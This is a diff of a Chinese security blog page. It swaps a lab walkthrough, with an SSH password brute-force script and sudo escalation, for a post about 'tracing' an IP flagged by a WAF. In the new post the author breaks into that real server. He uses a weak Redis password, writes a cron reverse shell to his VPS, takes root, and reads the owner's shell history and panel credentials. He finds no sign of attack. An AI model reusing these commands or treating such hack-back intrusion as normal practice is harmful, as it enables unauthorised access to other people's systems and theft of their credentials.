@@ -14,12 +14,12 @@
 
 <!-- Open Graph metadata -->
 <meta property="og:type" content="website" />
-<meta property="og:title" content="GainPower靶场渗透历程 | ©「哨兵」| Sentry Security" />
+<meta property="og:title" content="CST 2021年 4月14日 星期三：一次朔源事件的记录 | ©「哨兵」| Sentry Security" />
 <meta property="og:description" content="本站由哨兵安全实验室支持创办" />
 <meta property="og:image" content="http://localhost:80/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
-<meta property="og:url" content="http://localhost:80/blog/GainPower/walkthrough/" />
+<meta property="og:url" content="http://localhost:80/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/" />
 
-<title>GainPower靶场渗透历程 | ©「哨兵」| Sentry Security</title>
+<title>CST 2021年 4月14日 星期三：一次朔源事件的记录 | ©「哨兵」| Sentry Security</title>
 
 <!-- Bootstrap core CSS -->
 <link href="/assets/css/bootstrap.css" rel="stylesheet">
@@ -70,70 +70,254 @@
         <! -- SINGLE POST -->
         <div class="col-lg-8">
             <! -- Blog Post  -->
-            <a href="/blog/GainPower/walkthrough/"><h3 class="ctitle">GainPower靶场渗透历程</h3></a>
-            <p><csmall>Dec 2, 2020. | By: Bin4xin</csmall></p>
+            <a href="/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/"><h3 class="ctitle">CST 2021年 4月14日 星期三：一次朔源事件的记录</h3></a>
+            <p><csmall>Mar 13, 2021. | By: Bin4xin</csmall></p>
             <div class="post-content"> 
-            <ul>
-  <li>employee1:ssh banner发现问题；
+            <h3><em>《Bin4xin：我的网安从业朔源事件记录》</em></h3>
+
+<h3 id="零起源">零：起源</h3>
+
+<ul>
+  <li>
+    <p><em>一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声</em></p>
+
     <ul>
-      <li>根据提示获得低权限shell</li>
+      <li>
+        <p>甲方：小伙伴们接集团要求需对 <em>WAF全流量平台</em> 攻击ip进行朔源…</p>
+
+        <ul>
+          <li>废佬：这…（甲方你真可爱）</li>
+        </ul>
+      </li>
+      <li>
+        <p>领导1：溯源到攻击端信息是个新的领域，望小伙伴们通过此次集团安排做些尝试性学习和探索，
+  落实外部可借力工具和资源，<a href="https://www.github.com/Bin4xin" target="_blank">[@Bin4xin废佬]</a>也加入此次探索学习中。</p>
+
+        <ul>
+          <li>废佬：这…（领导你真可爱）</li>
+        </ul>
+      </li>
+      <li>
+        <p>领导2：<em>文件：《全流量、WAF4月8日-4月12日攻击IP(1).xlsx》</em></p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv    
+223.214.211.46
+36.59.38.115
+        
+$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv|wc -l
+16570
+</code></pre></div>        </div>
+        <ul>
+          <li>废佬：这…（领导你真可爱）</li>
+        </ul>
+      </li>
     </ul>
   </li>
-  <li>employee64:考验脚本编写能力（ssh爆破）
-    <ul>
-      <li>bash脚本批量连接</li>
-    </ul>
+  <li>
+    <p>于是废佬就开始了愉快 <em>boring</em> 的朔源之旅</p>
   </li>
-  <li>programmer:获取sudo shell
-    <ul>
-      <li>通过unshare切换到sudo用户</li>
-      <li><code class="language-plaintext highlighter-rouge">$ su - employee64</code></li>
-      <li><code class="language-plaintext highlighter-rouge">$ sudo -u programmer unshare</code></li>
-    </ul>
+</ul>
+
+<h3 id="一上午欢乐时光--fofa安全工程师">一：上午、欢乐时光 &amp; fofa安全工程师</h3>
+
+<blockquote>
+  <p>鲁迅：</p>
+
+  <p>不会朔源的fofa安全工程师不是一个好的信息安全工程师</p>
+</blockquote>
+
+<h4 id="-1x01awksplit--linux"># 1x01：awk、split &amp; linux</h4>
+
+<ul>
+  <li>步入主题之前，先对这些文件进行一些简单的操作：
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ split -l 300 全流量、WAF4月8日-4月12日攻击IP\(1\).csv ips_preview_by300_
+  $ cat ips_preview_by300_aa|wc -l                     
+     300
+  $ ll
+    total 1400
+    drwxr-xr-x  59 bin4xin  staff    1888  4 14 20:48 ./
+    drwxr-xr-x+ 43 bin4xin  staff    1376  4 14 20:45 ../
+    -rw-r--r--   1 bin4xin  staff    4548  4 14 20:48 ips_preview_by300_aa
+    -rw-r--r--   1 bin4xin  staff    4457  4 14 20:48 ips_preview_by300_ab
+    -rw-r--r--   1 bin4xin  staff    4481  4 14 20:48 ips_preview_by300_ac
+    ··· 
+</code></pre></div>    </div>
+    <p>这样我们就有了若干个300行ip的小文件，更方便我们筛选我们需要的ip，NEXT。</p>
   </li>
-  <li>vanshal:crontab计划获取shell
-    <ul>
-      <li>pspy tool to detected</li>
-      <li>/media/programmer/scripts/backup.sh</li>
-    </ul>
+  <li>
+    <p>just fofa：</p>
+
+    <p><img src="/assets/img/blog/2021/emergency-response-and-traceability-by-fofa.png" alt="" /></p>
   </li>
-  <li>root:secert zip file
+</ul>
+
+<h4 id="-1x02something-interesting"># 1x02：Something Interesting</h4>
+
+<ul>
+  <li><em>点击以了解 <a href="https://fofa.so/" target="_blank">fofa安全工程师们</a>与<a href="https://x.threatbook.cn/" target="_blank">微步安全工程师们</a></em></li>
+</ul>
+
+<p><img align="left" src="https://x.threatbook.cn/public/img/logo-in-header.882f692c.png" height="30%" width="50%" />
+<img align="right" src="https://fofa.so/_nuxt/img/logo.d9ee5c4.png" height="30%" width="50%" /></p>
+
+<p>欢乐而又短暂的上午如白驹过隙，一晃而过。</p>
+
+<hr />
+
+<h3 id="二下午枯燥时光--渗透测试工程师">二：下午、枯燥时光 &amp; 渗透测试工程师</h3>
+
+<h4 id="-2x01nmapnc--linux-shell"># 2x01：nmap、nc &amp; linux shell</h4>
+
+<p>终于：发现了一些有趣的：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE  SERVICE         VERSION
+22/tcp   open   ssh             OpenSSH 6.6.1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5 (RSA)
+|   256 9d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4 (ECDSA)
+|_  256 7b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1 (ED25519)
+80/tcp   open   http            nginx
+| http-ls: Volume /
+| SIZE  TIME               FILENAME
+| -     24-Feb-2021 13:21  admin/
+| -     24-Feb-2021 09:27  redis/
+| -     24-Aug-2017 04:55  staragent/
+| -     24-Feb-2021 08:44  www/
+| -     24-Feb-2021 08:44  www/htdocs/
+| -     13-Apr-2021 19:44  www/logs/
+|_
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Index of /
+888/tcp  open   http            nginx
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: 404 Not Found
+3306/tcp open   mysql           MySQL 5.5.62-log
+6379/tcp open   redis           Redis key-value store
+8080/tcp open   http            Apache Tomcat 8.5.63
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Apache Tomcat/8.5.63
+8888/tcp open   http            Ajenti http control panel
+</code></pre></div></div>
+
+<ul>
+  <li>事实上：这是一个宝塔面板，<code class="language-plaintext highlighter-rouge">8888+888</code>端口；</li>
+  <li>另一个事实是：这个被WAF报成<code class="language-plaintext highlighter-rouge">4月8日-4月12日攻击IP</code>的IP， <em>mysql &amp; redis</em> 均为弱口令。
     <ul>
-      <li>zip password crack</li>
-      <li>login ajenti to run root shell.</li>
+      <li><em><a href="https://xz.aliyun.com/t/8018#toc-8" target="_blank">点击更多以了解redis渗透</a></em></li>
     </ul>
   </li>
 </ul>
 
-<p>写个脚本来批量跑试试看：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
-
-pwn () {
-  read -p 'target ip: ' ip
-  sleep 2
-  for data in {1..100}
-  do
-      echo 'Try: ' $data
-      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
-      printf "\n"
-  done
-}
-
-pwn
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./redis-cli -h redis_target_ip           
+redis_target_ip:6379&gt; get key
+(error) NOAUTH Authentication required.
+redis_target_ip:6379&gt; 
+redis_target_ip:6379&gt; auth 123456
+OK
+redis_target_ip:6379&gt; get key
+(nil)
+redis_target_ip:6379&gt; set  xx   "\n* * * * * bash -i &gt;&amp; /dev/tcp/your_vps_target/port 0&gt;&amp;1\n"
+OK
+redis_target_ip:6379&gt; config set dir /var/spool/cron/
+OK
+redis_target_ip:6379&gt; config set dbfilename root
+OK
+redis_target_ip:6379&gt; save
+OK
+redis_target_ip:6379&gt; quit
 </code></pre></div></div>
-<p>for一下用户名密码{employee+$data}in{1..100}，使用sshpass进行批量ssh连接认证，并尝试<code class="language-plaintext highlighter-rouge">sudo</code>;
-失败如下：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[sudo] employee100 的密码：对不起，用户 employee100 不能在 localhost 上运行 sudo。
-</code></pre></div></div>
-<p>成功：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[sudo] employee64 的密码：匹配 %2$s 上 %1$s 的默认条目：
-    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
 
-用户 employee64 可以在 localhost 上运行以下命令：
-    (programmer) /usr/bin/unshare
-</code></pre></div></div>
-<p>所以用户employee64是拥有sudo权限；</p>
+<h4 id="-2x02bashinformation-gathering--traceability-incident"># 2x02：bash、Information gathering &amp; Traceability incident</h4>
 
+<p>于是我们通过上面步骤获得了服务器权限；<em>awesome ? next more awesome.</em></p>
+
+<p>通过在服务器的信息搜集，似乎看到了19年刚刚接触服务器的自己，没有任何嘲讽的意思，所有人都是初学者过来的；</p>
+
+<p><em><strong>NO OFFENCE:-)Thanks</strong></em></p>
+
+<ul>
+  <li>更加了解linux和linux面板，否则就会显得十分业余，不管你是Development, operation and maintenance or security practitioners；
+    <ul>
+      <li>匮乏的linux知识导致的过多ssh连接：
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ps -ef|grep ssh|wc -l
+  50
+</code></pre></div>        </div>
+      </li>
+      <li>错乱的终端与数据库命令运行：
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ cat /home/admin/.bash_history 
+  sudo grep wordpress_admin_passwd /root/env.txt
+  /usr/local/mysql/bin/mysql -u root -p123456
+  sudo su rooe
+  sudo su root
+  sudo grep mysql_root_passwd /root/env.txt
+  mysql
+  alias mysql=/usr/local/mysql/bin/mysql
+  mysql
+  find / -name mysql.sock
+  sudo grep mysql_root_passwd /root/env.txt
+  msyql
+  sudo su root
+  grant all privileges on *.* to 'root'@'%' identified by 'pass-hidden';
+  grant all privileges on *.* to 'root'@'%' identified by '123456';
+</code></pre></div>        </div>
+      </li>
+      <li>错误的linux权限分配：
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ ps -ef|grep root
+  root      7963     1  0 Mar06 ?        00:39:39 /usr/bin/java -Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar -Dcatalina.base=/www/server/apache-tomcat-8.5.63 -Dcatalina.home=/www/server/apache-tomcat-8.5.63 -Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temp org.apache.catalina.startup.Bootstrap start
+  root     23017     1  0 Mar06 ?        00:00:00 nginx: master process nginx -c conf/nginx.conf
+  root     27803     1  0 Feb25 ?        01:17:18 ./redis-server *:6379
+  ···
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>同样的：通过history找到面板管理密码；
+    <ul>
+      <li>tools.py form BT panel：
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ cat /root/.bash_history |grep tools
+  cd /www/server/panel &amp;&amp; python tools.py panel pass-hidden
+  $ cat /www/server/panel/tools.py
+        
+  if __name__ == "__main__":
+      type = sys.argv[1]
+      if type == 'root':
+          set_mysql_root(sys.argv[2])
+      elif type == 'panel':
+          set_panel_pwd(sys.argv[2])
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>所以，panel模式下对应的是面板密码设置；</p>
+
+<p><img src="/assets/img/blog/2021/stupid-bt-panel-control-pic.png" alt="" />
+至此，我们获得了 <em>root、redis、mysql、BT panel</em> ；而本文并炫技，我们的初衷是朔源：</p>
+
+<ul>
+  <li><em>mysql</em>：数据库仅仅是存放论坛系统管理的信息及测试信息；</li>
+  <li><em>redis</em>：配合 <em>mysql</em>，不必多说；</li>
+  <li><em>BT panel：www、ftp、sql</em> 等配置均为简单配置，没有参考价值。</li>
+</ul>
+
+<h3 id="三总结">三：总结</h3>
+
+<ul>
+  <li>1、本篇文章的存在意为信息搜集、朔源方向上的抛砖引玉，文笔不佳；</li>
+  <li>2、结合 <em># 2x01 及 # 2x02</em> 小结通篇结束并未发现攻击迹象、痕迹；</li>
+  <li>3、为何被报为攻击IP不得而知。</li>
+</ul>
+
+<h3 id="四申明">四：申明</h3>
+
+<p>作者：Bin4xin</p>
+
+<p>转载请申明本文链接：<a href="/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/" target="_blank">《Bin4xin：我的网安从业朔源事件记录》</a></p>
+
+<p>以上。</p>
 
             </div>
             <div class="spacing"></div>
